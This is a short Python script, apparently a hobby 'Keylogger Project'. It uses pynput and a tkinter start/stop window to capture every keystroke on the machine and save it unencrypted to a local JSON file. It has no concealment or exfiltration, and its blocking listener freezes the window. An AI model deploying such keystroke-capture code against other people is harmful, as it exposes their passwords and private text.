from pynput.keyboard import Listener
import tkinter as tk
import json

root = tk.Tk()
root.geometry("350x400")
root.title("Keylogger Project")

key_list = []
x = False
key_strokes = ""

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def stop_keylogger():
    root.destroy()

start_button = tk.Button(root, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=20)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

root.mainloop()
